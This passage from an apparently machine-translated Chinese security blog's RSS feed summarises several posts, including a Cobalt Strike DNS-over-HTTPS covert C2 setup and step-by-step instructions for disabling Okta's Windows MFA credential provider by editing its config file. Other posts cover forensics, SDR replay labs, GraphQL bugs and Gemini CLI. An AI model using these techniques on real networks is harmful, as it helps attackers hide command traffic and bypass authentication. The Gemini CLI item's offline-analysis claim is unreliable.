        <link>http://localhost:1313/p/%E5%9C%A8cobalt-strike%E4%B8%AD%E5%88%A9%E7%94%A8dns-over-https%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%94%BD%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/</link>
        <pubDate>Sat, 02 Aug 2025 19:21:02 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%9C%A8cobalt-strike%E4%B8%AD%E5%88%A9%E7%94%A8dns-over-https%E5%AE%9E%E7%8E%B0%E9%9A%90%E8%94%BD%E5%91%BD%E4%BB%A4%E6%8E%A7%E5%88%B6/</guid>
        <description>&lt;h1 id=&#34;dns-over-https-for-cobalt-strike&#34;&gt;DNS Over HTTPS for Cobalt Strike
&lt;/h1&gt;&lt;h2 id=&#34;引言&#34;&gt;引言
&lt;/h2&gt;&lt;p&gt;近年来，红队行动中C2基础设施的搭建变得越来越困难。这对安全社区来说是件好事，因为这意味着厂商和专业从业者已经从过去成功的技术中吸取教训，并在网络中实施了有效的缓解措施。&lt;/p&gt;
&lt;p&gt;DNS over HTTPS（DoH）是一个未被充分重视的命令控制通道。本文将展示如何在Cobalt Strike中使用DoH，这种方式无需第三方账户或基础设施设置，通过有效的SSL证书加密流量，并将通信发送到信誉良好的域名。&lt;/p&gt;
&lt;h2 id=&#34;现有技术&#34;&gt;现有技术
&lt;/h2&gt;&lt;p&gt;攻击者和攻防安全专业人员使用不同的重定向器实现已有一段时间。最早使用的重定向器是配置了各种转发规则的简单Apache和Nginx服务器。&lt;/p&gt;
&lt;p&gt;重定向器不仅能增强基础设施的弹性，还能绕过依赖域名分类的防御措施。例如，当内容分发网络（CDN）对开发者更易获取后，攻击者就从传统重定向器转向这些平台，因为它们通常提供有效域名甚至SSL证书，减少了攻击者的工作量。&lt;/p&gt;
&lt;p&gt;后来出现的&amp;quot;域名伪装&amp;quot;技术被许多测试者大量使用。但最近CDN提供商开始打击这种行为。许多网站完全禁止域名伪装或主动搜索使用该技术的人。特别是微软，曾在行动中直接关闭Azure订阅。&lt;/p&gt;
&lt;h2 id=&#34;dns-over-https&#34;&gt;DNS over HTTPS
&lt;/h2&gt;&lt;p&gt;传统DNS信标相对容易被检测。我从未在行动中使用过Cobalt Strike的DNS监听器，仅限于之前描述的HTTPS监听器和重定向器。&lt;/p&gt;
&lt;p&gt;通过DoH实现的Beacon为我们提供了信誉良好的域名和有效的SSL证书，无需账户或重定向器配置。这进一步减少了操作员的设置时间，并消除了账户被关闭的风险。&lt;/p&gt;
&lt;h2 id=&#34;今日主题cobalt-strike中的dns-over-https&#34;&gt;今日主题：Cobalt Strike中的DNS over HTTPS
&lt;/h2&gt;&lt;p&gt;Austin Hudson首次在Twitter上向我介绍了DoH的使用。他过去一年的推文详细记录了实现这一功能的进展，并最终开发出开源工具TitanLdr。这个Cobalt Strike用户定义反射加载器（UDRL）通过钩取Beacon的导入地址表（IAT），将负责传统DNS查询的API调用（DNSQuery_A）替换为向dns.google（8.8.8.8和8.8.4.4）发送DoH请求的函数。&lt;/p&gt;
&lt;p&gt;仅这一点就是极佳的能力，但TitanLdr的DNSQuery_A钩子具有足够通用性，可与许多不同的DoH服务器配合使用！我已测试以下域名并确认它们可作为即插即用的替代方案：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;dns.quad9.net&lt;/li&gt;
&lt;li&gt;mozilla.cloudflare-dns.com&lt;/li&gt;
&lt;li&gt;cloudflare-dns.com&lt;/li&gt;
&lt;li&gt;doh.opendns.com&lt;/li&gt;
&lt;li&gt;ordns.he.net&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用titanldr&#34;&gt;使用TitanLdr
&lt;/h2&gt;&lt;p&gt;TitanLdr是将此功能集成到Cobalt Strike的关键。原始版本的TitanLdr可通过单一DNS提供商进行HTTPS通信：https://github.com/secidiot/TitanLdr。您可以在hooks目录下的DnsQuery_A.c文件第111行更改DNS服务器。&lt;/p&gt;
&lt;p&gt;我还fork了TitanLdr以支持指定多个DoH服务器。每次回调时，Beacon会从硬编码列表中随机选择一个。如需使用多个DoH服务器，可从https://github.com/kyleavery/TitanLdr下载我的fork版本。hooks目录下DnsQuery_A.c文件的第116行可修改服务器列表。&lt;/p&gt;
&lt;p&gt;下载后需要构建程序，这需要安装NASM和MinGW的Linux主机。安装这些程序后，运行make命令创建必要文件。&lt;/p&gt;
&lt;p&gt;将Titan.cna Aggressor脚本导入Cobalt Strike后，即可使用DoH！像往常一样配置DNS监听器。Cobalt Strike文档对此监听器的配置有更详细介绍。&lt;/p&gt;
&lt;h2 id=&#34;dns-over-https的缺点&#34;&gt;DNS over HTTPS的缺点
&lt;/h2&gt;&lt;p&gt;虽然DoH信标相比传统HTTPS信标有优势，但也存在明显缺点：&lt;/p&gt;
&lt;p&gt;首先，传输相同信息需要更多数据包。DNS TXT记录最多只能包含255个字符，意味着每个数据包只能发送少量数据。&lt;/p&gt;
&lt;p&gt;其次，我们对可用服务器的路径或域名没有控制权。环境或设备拒绝向流行或已知DoH服务器发送443/TCP出站流量，比阻止Microsoft的*.azurewebsites.net或Cloudflare的*.workers.dev似乎更容易。可以通过使用更冷门的DoH服务器或自行构建并随时间推移进行分类来解决此问题，具体取决于环境配置。&lt;/p&gt;
&lt;h2 id=&#34;潜在检测方法&#34;&gt;潜在检测方法
&lt;/h2&gt;&lt;p&gt;当前检测技术在检测DNS over HTTPS方面可能存在漏洞：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;针对恶意HTTPS流量的检测通常利用域名信誉，对DoH可能无效，因为使用的域名信誉良好&lt;/li&gt;
&lt;li&gt;针对恶意DNS流量的检测通常监控大量DNS请求，对DoH可能无效，因为流量不再使用DNS协议&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;传统DNS监控与SSL检查相结合可能是潜在解决方案，但我目前不知道有任何工具或产品这样做。&lt;/p&gt;
&lt;p&gt;我认为防御此攻击的主要方法是阻止向组织未使用的已知DoH服务器发送443/TCP出站流量。我遇到的大多数网络仍使用传统DNS，通常作为Active Directory环境一部分运行本地DNS服务器。这种情况下，无需允许向dns.google、cloudflare-dns.com或本文提到的其他服务器发送HTTPS流量。&lt;/p&gt;
&lt;h2 id=&#34;结束语&#34;&gt;结束语
&lt;/h2&gt;&lt;p&gt;绝对有更多DNS over HTTPS服务器可用于此配置。此外，用户可以设置自己的DoH服务器，甚至可能位于CDN或其他云服务后面，以引入此技术的变体。&lt;/p&gt;
&lt;p&gt;TitanLdr仅限于Cobalt Strike，但DoH实现可以移植到任何其他C2框架。这种方法并非在所有情况下都是最佳选择，但它是我希望您能利用的工具箱中的另一个工具。如有任何问题或意见，请通过Twitter @kyleavery_与我联系。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>绕过Windows版Okta多因素认证凭证提供程序的技术分析</title>
        <link>http://localhost:1313/p/%E7%BB%95%E8%BF%87windows%E7%89%88okta%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E5%87%AD%E8%AF%81%E6%8F%90%E4%BE%9B%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 19:09:44 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BB%95%E8%BF%87windows%E7%89%88okta%E5%A4%9A%E5%9B%A0%E7%B4%A0%E8%AE%A4%E8%AF%81%E5%87%AD%E8%AF%81%E6%8F%90%E4%BE%9B%E7%A8%8B%E5%BA%8F%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h1 id=&#34;绕过windows版okta多因素认证凭证提供程序&#34;&gt;绕过Windows版Okta多因素认证凭证提供程序
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;发布日期：2023年2月16日&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;需要提前说明的是，这是一项&lt;strong&gt;后渗透技术&lt;/strong&gt;，主要适用于已通过其他方式获取系统管理员权限后，希望在不触发MFA的情况下进行RDP连接的场景。&lt;/p&gt;
&lt;h2 id=&#34;技术背景&#34;&gt;技术背景
&lt;/h2&gt;&lt;p&gt;Okta MFA凭证提供程序通过多因素认证强化远程桌面协议(RDP)的安全验证。启用该功能后，访问已加入域的Windows工作站和服务器时，RDP客户端会强制要求MFA验证。&lt;/p&gt;
&lt;p&gt;（参考：&lt;a class=&#34;link&#34; href=&#34;https://help.okta.com/en-us/Content/Topics/Security/proc-mfa-win-creds-rdp.htm&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;Okta官方文档&lt;/a&gt;）&lt;/p&gt;
&lt;h2 id=&#34;与duo方案的差异&#34;&gt;与Duo方案的差异
&lt;/h2&gt;&lt;p&gt;本技术与作者此前发布的《绕过Duo双因素认证》方法类似，但存在关键差异：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Okta默认不启用&amp;quot;故障开放&amp;quot;（fail open）模式&lt;/li&gt;
&lt;li&gt;默认配置不限于RDP场景，因此控制台绕过成功率较低&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;技术实现&#34;&gt;技术实现
&lt;/h2&gt;&lt;p&gt;在已获取管理员权限的shell中，可通过以下步骤禁用MFA验证：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;定位配置文件路径：
&lt;code&gt;C:\Program Files\Okta\Okta Windows Credential Provider\config\rdp_app_config.json&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;修改两个关键参数：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将&lt;code&gt;InternetFailOpenOption&lt;/code&gt;值改为&lt;code&gt;true&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;将&lt;code&gt;Url&lt;/code&gt;值修改为无效地址&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;完成上述修改后，RDP连接将不再触发Okta MFA验证。&lt;/p&gt;
&lt;h2 id=&#34;注意事项&#34;&gt;注意事项
&lt;/h2&gt;&lt;p&gt;虽然管理员权限可以直接卸载软件，但修改配置文件是最隐蔽的持久化方法。操作完成后可随时恢复原配置。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>内存取证实战 | 网络安全与蓝队技术解析</title>
        <link>http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AE%9E%E6%88%98-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 18:58:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E5%86%85%E5%AD%98%E5%8F%96%E8%AF%81%E5%AE%9E%E6%88%98-%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%8E%E8%93%9D%E9%98%9F%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;直播内容概要&#34;&gt;直播内容概要
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;主题&lt;/strong&gt;：内存取证技术在网络安全与蓝队行动中的应用&lt;br&gt;
&lt;strong&gt;技术要点&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;内存取证基础原理与实战价值&lt;/li&gt;
&lt;li&gt;使用工具分析内存转储中的恶意活动痕迹&lt;/li&gt;
&lt;li&gt;蓝队视角下的入侵检测与响应技术&lt;/li&gt;
&lt;li&gt;真实攻击案例中的内存取证流程演示&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;资源链接&#34;&gt;资源链接
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;视频赞助：https://www.tcm.rocks/Sponsors&lt;/li&gt;
&lt;li&gt;渗透测试服务：https://tcm-sec.com&lt;/li&gt;
&lt;li&gt;培训课程：https://academy.tcm-sec.com&lt;/li&gt;
&lt;li&gt;认证考试：https://certifications.tcm-sec.com&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;推荐技术书籍&#34;&gt;推荐技术书籍
&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;《渗透测试实战指南》&lt;/li&gt;
&lt;li&gt;《黑客攻防技术宝典：Web实战篇》&lt;/li&gt;
&lt;li&gt;《Python黑帽编程》&lt;/li&gt;
&lt;li&gt;《Linux黑客基础教程》&lt;/li&gt;
&lt;/ol&gt;
</description>
        </item>
        <item>
        <title>网络安全的核心在于人：2022年网络安全意识月回顾</title>
        <link>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%9C%A8%E4%BA%8E%E4%BA%BA2022%E5%B9%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E6%9C%88%E5%9B%9E%E9%A1%BE/</link>
        <pubDate>Sat, 02 Aug 2025 18:42:53 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9A%84%E6%A0%B8%E5%BF%83%E5%9C%A8%E4%BA%8E%E4%BA%BA2022%E5%B9%B4%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%84%8F%E8%AF%86%E6%9C%88%E5%9B%9E%E9%A1%BE/</guid>
        <description>&lt;p&gt;随着2022年网络安全意识月落幕，我由衷感谢这个自2004年设立的活动持续推动网络安全议题。虽然活动结束，但网络安全工作永无止境。网络安全常被视为复杂的技术问题，但其核心始终关乎人——我们保护的客户与社区、奋战在前线的网络安全专家，以及共同强化全球网络安全的整个社区。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;ldquo;当每个人都尽己所能时，攻击者就必须击败我们所有人才能击败其中一人。&amp;rdquo;&lt;br&gt;
——美国国家网络总监克里斯·英格利斯&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;对客户的承诺&lt;/strong&gt;体现在持续提升安全防护能力。微软安全响应中心（MSRC）每日创新防御技术，例如运用AI/ML提升事件响应效率。除技术革新外，我们还通过MSRC博客分享安全研究成果，并优化安全更新指南（SUG）通知系统，帮助客户管理风险。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;前线网络卫士&lt;/strong&gt;是抵御攻击的中坚力量。MSRC团队全天候应对新兴威胁，但网络安全人才短缺加剧了挑战。微软正通过教育项目培养未来人才——技术固然重要，但人才是关键。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;协作的力量&lt;/strong&gt;推动着安全标准的提升。我们与政府、学术界及安全社区建立深度合作，特别是通过漏洞赏金计划和研究者认可计划加强与安全研究者的联系。他们的贡献对全球客户防护至关重要。&lt;/p&gt;
&lt;p&gt;网络安全本质是&lt;strong&gt;人的事业&lt;/strong&gt;，每个人都能为构建更安全的数字世界贡献力量。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>软件定义无线电(SDR)攻防实验：无线门铃与Keeloq钥匙扣攻击实战</title>
        <link>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</link>
        <pubDate>Sat, 02 Aug 2025 18:26:56 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%BD%AF%E4%BB%B6%E5%AE%9A%E4%B9%89%E6%97%A0%E7%BA%BF%E7%94%B5sdr%E6%94%BB%E9%98%B2%E5%AE%9E%E9%AA%8C%E6%97%A0%E7%BA%BF%E9%97%A8%E9%93%83%E4%B8%8Ekeeloq%E9%92%A5%E5%8C%99%E6%89%A3%E6%94%BB%E5%87%BB%E5%AE%9E%E6%88%98/</guid>
        <description>&lt;h1 id=&#34;wild-west-hackin-fest-wwhf-sdr-实验室&#34;&gt;Wild West Hackin&amp;rsquo; Fest (WWHF) SDR 实验室
&lt;/h1&gt;&lt;p&gt;作者：David Fletcher //&lt;/p&gt;
&lt;p&gt;在WWHF会议期间，许多参会者索要软件定义无线电(SDR)实验的器材清单和源代码以便在家实践。由于需要根据会议期间的观察修改实验文档和代码，直到现在才完成整理。以下是完整的WWHF SDR实验资料，每个实验包含：器材清单、实验指南和实验脚本，下载全部三个文件即可开始实践。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：器材清单中的产品不代表官方推荐，仅为我们实际使用的设备。&lt;/p&gt;
&lt;h2 id=&#34;无线门铃攻击实验&#34;&gt;无线门铃攻击实验
&lt;/h2&gt;&lt;p&gt;本实验演示对无线门铃信号的捕获、分析与合成，通过手动解码和重放攻击展示防重放机制的必要性。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;器材清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) 无线门铃 - $16.99&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/Heath-Zenith-DL-6166-Wireless-Doorbell/dp/B00HDDD9HI&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;(1) RTL-SDR接收器 - $19.95&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/NooElec-NESDR-Mini-Compatible-Packages/dp/B009U7WZCA&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;(1) YardStick One发射器 - $123.95&lt;br&gt;
&lt;a class=&#34;link&#34; href=&#34;https://www.amazon.com/YARD-Stick-One-Transceiver-Antenna/dp/B06Y1RVHBP&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;亚马逊链接&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实验文件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;实验手册&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;攻击脚本&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;keeloq钥匙扣攻击实验&#34;&gt;Keeloq钥匙扣攻击实验
&lt;/h2&gt;&lt;p&gt;本实验演示汽车钥匙滚动码信号的捕获与分析，揭示滚动码的保护机制及带外接收重放漏洞。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;器材清单&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;(1) 迷你面包板 - $5.69&lt;/li&gt;
&lt;li&gt;(1) 面包板电源模块 - $5.49&lt;/li&gt;
&lt;li&gt;(1) 面包板跳线 - $6.29&lt;/li&gt;
&lt;li&gt;(1) 2.54mm单排排针 - $5.59&lt;/li&gt;
&lt;li&gt;(2) PiStop交通信号灯 - $7.82&lt;/li&gt;
&lt;li&gt;(1) Keeloq钥匙套件 - $21.95&lt;/li&gt;
&lt;li&gt;(1) RTL-SDR接收器 - $19.95&lt;/li&gt;
&lt;li&gt;(1) YardStick One发射器 - $123.95&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;实验文件&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;接线图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;实验手册&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a class=&#34;link&#34; href=&#34;%e9%93%be%e6%8e%a5&#34; &gt;解码脚本&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;blockquote&gt;
&lt;p&gt;想深入学习？Antisyphon提供可自主定价的进阶培训课程，支持直播/点播学习。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>GraphQL API漏洞挖掘实战：漏洞赏金案例分析</title>
        <link>http://localhost:1313/p/graphql-api%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 18:15:58 +0800</pubDate>
        
        <guid>http://localhost:1313/p/graphql-api%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E5%AE%9E%E6%88%98%E6%BC%8F%E6%B4%9E%E8%B5%8F%E9%87%91%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;graphql与未授权数据访问漏洞&#34;&gt;GraphQL与未授权数据访问漏洞
&lt;/h3&gt;&lt;p&gt;0:19 章节探讨攻击者如何绕过权限控制获取敏感数据，包含HackerOne案例#343464分析&lt;/p&gt;
&lt;h3 id=&#34;graphql与未授权数据创建修改漏洞&#34;&gt;GraphQL与未授权数据创建/修改漏洞
&lt;/h3&gt;&lt;p&gt;2:15 演示通过GraphQL突变(Mutation)实现未授权数据操作的漏洞模式，引用HackerOne报告#2233480&lt;/p&gt;
&lt;h3 id=&#34;graphql与未授权数据删除漏洞&#34;&gt;GraphQL与未授权数据删除漏洞
&lt;/h3&gt;&lt;p&gt;3:27 分析危险的数据删除操作漏洞，涉及HackerOne案例#858671&lt;/p&gt;
&lt;h3 id=&#34;graphql如何导致dos攻击&#34;&gt;GraphQL如何导致DoS攻击
&lt;/h3&gt;&lt;p&gt;6:11 解析复杂查询嵌套导致的服务器资源耗尽问题，引用LANDH技术博客2024年3月分析报告&lt;/p&gt;
&lt;h3 id=&#34;graphql中的sql注入漏洞&#34;&gt;GraphQL中的SQL注入漏洞
&lt;/h3&gt;&lt;p&gt;7:29 展示GraphQL参数如何传导至后端数据库，包含HackerOne案例#435066的注入技术细节&lt;/p&gt;
&lt;h3 id=&#34;graphql模式泄露是否算漏洞&#34;&gt;GraphQL模式泄露是否算漏洞？
&lt;/h3&gt;&lt;p&gt;10:09 讨论introspection查询暴露API结构的风险，分析敏感信息泄露场景&lt;/p&gt;
&lt;h3 id=&#34;graphql的csrf攻击面&#34;&gt;GraphQL的CSRF攻击面
&lt;/h3&gt;&lt;p&gt;11:28 讲解跨站请求伪造在GraphQL中的特殊表现形式，引用Doyensec安全研究报告&lt;/p&gt;
&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;https://bbre.dev/gql&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;获取完整案例研究&lt;/a&gt; | &lt;a class=&#34;link&#34; href=&#34;https://bbre.dev/nl&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;订阅邮件列表&lt;/a&gt; | &lt;a class=&#34;link&#34; href=&#34;https://bbre.dev/tw&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt;关注Twitter&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;关键资源链接已内嵌在时间轴章节中，包含DEF CON 32会议资料和GitHub OAuth CSRF绕过技术博客等专业参考内容。&lt;/p&gt;&lt;/blockquote&gt;
</description>
        </item>
        <item>
        <title>谷歌Gemini CLI：开发者免费AI工具的革命性命令行体验</title>
        <link>http://localhost:1313/p/%E8%B0%B7%E6%AD%8Cgemini-cli%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E8%B4%B9ai%E5%B7%A5%E5%85%B7%E7%9A%84%E9%9D%A9%E5%91%BD%E6%80%A7%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%93%E9%AA%8C/</link>
        <pubDate>Sat, 02 Aug 2025 17:54:46 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E8%B0%B7%E6%AD%8Cgemini-cli%E5%BC%80%E5%8F%91%E8%80%85%E5%85%8D%E8%B4%B9ai%E5%B7%A5%E5%85%B7%E7%9A%84%E9%9D%A9%E5%91%BD%E6%80%A7%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%BD%93%E9%AA%8C/</guid>
        <description>&lt;h1 id=&#34;革命性命令行工具gemini-cli全面解析&#34;&gt;革命性命令行工具：Gemini CLI全面解析
&lt;/h1&gt;&lt;p&gt;命令行界面（CLI）数十年来始终是开发者工作流的核心。如今随着软件开发复杂度激增，谷歌推出的Gemini CLI将多模态AI能力直接注入终端环境，为开发者带来智能化的全新体验。&lt;/p&gt;
&lt;h2 id=&#34;gemini技术架构&#34;&gt;Gemini技术架构
&lt;/h2&gt;&lt;p&gt;Gemini 1.5 Pro作为当前旗舰模型，具备以下技术特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;百万级上下文支持&lt;/strong&gt;：可处理长达100万token的代码/文档&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;多模态处理&lt;/strong&gt;：同步解析文本、代码、图像、PDF等格式&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ReAct执行框架&lt;/strong&gt;：通过&amp;quot;推理-执行&amp;quot;循环实现智能任务处理&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;核心功能矩阵&#34;&gt;核心功能矩阵
&lt;/h2&gt;&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;功能模块&lt;/th&gt;
          &lt;th&gt;技术实现细节&lt;/th&gt;
          &lt;th&gt;典型应用场景&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;代码智能&lt;/td&gt;
          &lt;td&gt;跨文件代码分析/自动重构/异常诊断&lt;/td&gt;
          &lt;td&gt;复杂BUG追踪/测试用例生成&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;工作流自动化&lt;/td&gt;
          &lt;td&gt;集成Git/CI/CD工具链&lt;/td&gt;
          &lt;td&gt;部署流水线优化/日志监控&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;多模态交互&lt;/td&gt;
          &lt;td&gt;OCR识别/图像转代码/文档摘要&lt;/td&gt;
          &lt;td&gt;设计稿转前端代码/报告速读&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;上下文感知&lt;/td&gt;
          &lt;td&gt;@file指令实时读取项目文件&lt;/td&gt;
          &lt;td&gt;精准代码建议/文档生成&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;开发者技术栈集成&#34;&gt;开发者技术栈集成
&lt;/h2&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 安装部署（需Node.js≥18环境）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;npm install -g @google/gemini-cli gemini
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# API密钥配置（提升调用限额）&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;export&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;GEMINI_API_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;your_actual_key&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;技术优势对比&#34;&gt;技术优势对比
&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;strong&gt;零成本入门&lt;/strong&gt;：每日1000次免费请求额度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;本地化处理&lt;/strong&gt;：支持敏感代码的离线分析&lt;/li&gt;
